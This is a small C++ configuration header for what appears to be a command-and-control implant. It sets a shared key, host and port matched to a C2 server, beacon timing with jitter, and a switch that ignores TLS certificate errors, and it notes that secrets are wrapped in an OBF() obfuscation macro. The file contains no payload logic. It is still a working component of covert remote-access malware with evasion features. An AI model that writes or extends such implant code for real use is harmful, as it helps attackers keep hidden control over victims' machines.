// Compiled-in defaults; call sites wrap secrets with OBF().
#pragma once
#include <cstdint>

namespace cfg {

// Must match server C2_PSK. Override: -DC2_PSK=... -DC2_HOST=... -DC2_PORT=...
#ifndef C2_PSK
#define C2_PSK "change-me-shared-key"
#endif
#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8443
#endif

// Beaconing
constexpr std::uint32_t kBeaconIntervalSec = 5;
constexpr std::uint32_t kBeaconJitterSec   = 2;

// Ignore self-signed CN/date errors; set false with a trusted CA.
constexpr bool kIgnoreCertErrors = true;

} // namespace cfg
